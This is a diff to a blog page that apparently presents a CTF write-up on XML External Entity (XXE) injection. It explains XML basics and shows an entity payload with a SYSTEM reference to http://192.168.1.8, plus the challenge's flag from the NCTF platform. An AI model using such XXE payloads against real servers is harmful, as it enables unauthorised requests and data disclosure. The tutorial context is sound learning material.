@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>The-XXe | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。 2.So,How is the Xml working?XML is a extend of HTMLit’s not a replacment of HTML,but it must be a extend of">
+  <meta name="description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="The-XXe">
 <meta property="og:url" content="http://yoursite.com/2019/11/26/The-XXe/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。 2.So,How is the Xml working?XML is a extend of HTMLit’s not a replacment of HTML,but it must be a extend of">
+<meta property="og:description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-11-26T05:45:07.910Z">
+<meta property="og:updated_time" content="2019-11-26T05:49:40.485Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The-XXe">
-<meta name="twitter:description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。 2.So,How is the Xml working?XML is a extend of HTMLit’s not a replacment of HTML,but it must be a extend of">
+<meta name="twitter:description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -174,7 +174,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="1-What-is-the-XXE"><a href="#1-What-is-the-XXE" class="headerlink" title="1.What is the XXE?"></a>1.What is the XXE?</h2><p>XXE(XML External Entity Injection)中文名为XML外部实体注入。<br>要充分了解这个注入方式，得先了解XML的构造。</p>
+        <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="1-What-is-the-XXE"><a href="#1-What-is-the-XXE" class="headerlink" title="1.What is the XXE?"></a>1.What is the XXE?</h2><p>XXE(XML External Entity Injection)中文名为XML外部实体注入。<br>要充分了解这个注入方式，得先了解XML的构造。<a id="more"></a></p>
 <h2 id="2-So-How-is-the-Xml-working"><a href="#2-So-How-is-the-Xml-working" class="headerlink" title="2.So,How is the Xml working?"></a>2.So,How is the Xml working?</h2><p>XML is a extend of HTML<br>it’s not a replacment of HTML,but it must be a extend of<br>HTML.<br>XML(Extensible Markup Language)<br>中文名:可扩展标记语言<br>它是一种标记语言，它的设计宗旨是传输数据，而并非显示数据，这也是与HTML的区别。<br>XML的标签没有被预定义，因此用户可以自行定义自己的特色标签，如下所示:</p>
 <figure class="highlight plain"><figcaption><span>easy write</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;writeby&gt;Cupit&lt;/writeby&gt;</span><br><span class="line">&lt;to&gt;James&lt;/to&gt;</span><br></pre></td></tr></table></figure>
 
@@ -203,6 +203,7 @@
 <figure class="highlight plain"><figcaption><span>XXE[</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.8&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;21412&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
 
 <p>可以看到response的回应：<br><code>&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;NCTF{XXE-labs_is_g00d}&lt;/msg&gt;&lt;/result&gt;</code></p>
+<p>##结语##<br>最后附上学习链接：2019NCTF平台:<a href="https://nctf.x1c.club/" target="_blank" rel="noopener">https://nctf.x1c.club/</a>(现应该已关)<br>W3school:<a href="https://www.w3school.com.cn/dtd/dtd_intro.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/dtd/dtd_intro.asp</a></p>
 
       
 
